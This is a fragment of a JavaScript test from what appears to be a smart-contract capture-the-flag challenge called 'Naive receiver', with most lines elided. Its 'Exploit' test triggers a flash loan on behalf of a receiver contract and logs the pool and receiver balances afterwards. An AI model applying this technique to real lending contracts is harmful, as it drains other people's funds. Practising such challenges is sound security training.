...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    await this.pool.flashLoan(this.receiver.address, ether("9"));
    ...
    const receiverContractBalanceAfter = await balance.current(this.receiver.address);
    const poolBalanceAfter = await balance.current(this.pool.address);
    console.log(`poolBalanceAfter: ${poolBalanceAfter.toString()}`);
    console.log(`receiverContractBalanceAfter: ${receiverContractBalanceAfter.toString()}`);
  });
